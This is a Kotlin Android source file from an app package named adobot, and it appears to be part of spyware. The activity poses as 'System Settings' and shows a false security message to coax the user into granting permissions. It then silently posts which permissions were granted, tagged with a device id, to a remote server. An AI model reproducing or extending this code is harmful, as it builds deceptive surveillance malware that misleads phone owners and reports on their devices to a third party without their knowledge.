package me.adobot.activities

import android.app.AlertDialog
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import com.github.kittinunf.fuel.Fuel
import kotlinx.android.synthetic.main.activity_permissions.*
import me.adobot.CommonParams
import me.adobot.Constants
import me.adobot.R
import java.util.HashMap
import android.support.v4.app.ActivityCompat


class PermissionsActivity : BaseActivity() {

    private val permissionRationale = "System Settings keeps your android phone secure. Allow System Settings to protect your phone?"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        showUI()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!hasPermissions())
                askPermissions()
        } else {
            done()
        }
    }

    private fun showUI() {
        setContentView(R.layout.activity_permissions)
        permit_btn.setOnClickListener({
            askPermissions()
        })
    }

    private fun askPermissions() {

        var k = 0
        for (i in Constants.PERMISSIONS)
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, i)) k++

        if (k > 0) showPermissionRationale()
        else ActivityCompat.requestPermissions(this, Constants.PERMISSIONS, 1)
    }

    private fun showPermissionRationale() {
        AlertDialog.Builder(this).setIcon(R.mipmap.ic_launcher).setTitle("Permission Required")
                .setMessage(permissionRationale)
                .setPositiveButton("OK") { dialog, _ ->
                    dialog.dismiss()
                    ActivityCompat.requestPermissions(this, Constants.PERMISSIONS, 1)
                }
                .setNegativeButton("Cancel") { dialog, _ ->
                    finish()
                    dialog.dismiss()
                }
                .create().show()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        for (i in grantResults.indices)
            Log.i("Suthar", "Grant result: " + grantResults[i])

        updatePermissions(permissions, grantResults)
        done()
    }

    private fun updatePermissions(perms: Array<out String>, results: IntArray) {

        val done: HashMap<String, String> = HashMap()
        for (i in perms.indices) {
            done[perms[i]] = if (results[i] == PackageManager.PERMISSION_GRANTED) "1" else "0"
        }

        Log.d("Suthar", "permissions :$done")

        val data = listOf("permissions" to done)

        val commonParams = CommonParams(this)

        Fuel.post(commonParams.server + "/permissions/" + commonParams.uid + "/" + commonParams.device, parameters = data)
                .response { request, response, result ->
                    Log.d("Suthar", "request :" + request)
                    Log.d("Suthar", "response :" + response)
                    Log.d("Suthar", "result :" + result)
                }
    }
}

